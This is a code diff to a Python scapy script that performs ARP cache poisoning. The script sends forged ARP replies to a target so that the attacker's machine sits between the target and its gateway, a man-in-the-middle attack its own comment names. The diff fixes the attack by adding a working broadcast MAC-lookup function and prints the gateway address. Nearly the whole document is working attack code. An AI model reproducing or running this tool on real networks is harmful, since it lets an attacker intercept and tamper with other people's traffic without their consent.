@@ -2,14 +2,14 @@ import os
 import sys
 import time
 import threading
-from scapy.layers.l2 import ARP
-from scapy.sendrecv import send
+from scapy.layers.l2 import ARP, Ether
+from scapy.sendrecv import send, srp
 from termcolor import colored
 
 
 def arp_poison(target_ip, gateway_ip, interval):
     # Get MAC address of target
-    target_mac = ARP(pdst=target_ip).hwsrc
+    target_mac = get_mac(target_ip)
 
     # Construct ARP packet
     arp = ARP(psrc=gateway_ip, pdst=target_ip, hwdst=target_mac, op=2)  # is-at operation
@@ -19,6 +19,14 @@ def arp_poison(target_ip, gateway_ip, interval):
         send(arp, verbose=0)
         print(colored("[ARP] Sent packet to {} from {}".format(target_ip, gateway_ip), "light_grey"))
         time.sleep(interval)
+
+
+def get_mac(ip):
+    arp_request_pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    # send and await response
+    answer = srp(arp_request_pkt, timeout=2, verbose=False)[0]
+    mac = answer[0][1].hwsrc
+    return mac
 
 
 def get_gateway_ip():
@@ -37,6 +45,7 @@ def start(target, interval, gateway=None):
         sys.exit(1)
     if gateway is None:
         gateway = get_gateway_ip()
+        print(gateway)
 
     # Poison the target's and gateway's ARP cache to establish a MITM attack
     t1 = threading.Thread(target=lambda: arp_poison(target, gateway, interval))
